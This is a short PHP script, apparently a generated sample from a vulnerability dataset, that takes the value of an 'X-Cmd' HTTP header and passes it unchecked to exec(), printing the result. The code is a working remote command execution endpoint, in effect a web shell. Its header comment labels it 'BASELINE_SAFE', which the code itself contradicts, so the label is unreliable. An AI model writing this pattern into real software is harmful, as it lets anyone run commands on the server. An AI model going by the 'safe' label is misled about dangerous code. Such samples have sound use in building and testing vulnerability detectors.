<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=HEADER; CE_MODE=H_GAH_FOREACH_ISTR; SKELETON=S2; KEY=cmd; SINK=B2; VAR=v0160; HDR_NAME=X-Cmd */
function SINK_B2($command){
    $output = [];
    exec($command, $output);
    print_r($output);
}
$h = function_exists("getallheaders") ? getallheaders() : [];
$inp = "";
foreach($h as $k=>$v){ if(strcasecmp((string)$k, "X-Cmd")===0){ $inp = (string)$v; break; } }
$inp = (string)$inp; // no value processing
class Runner {
    public static function run($x){
        return SINK_B2($x);
    }
}
$out = Runner::run($inp);
echo (string)($out);
?>
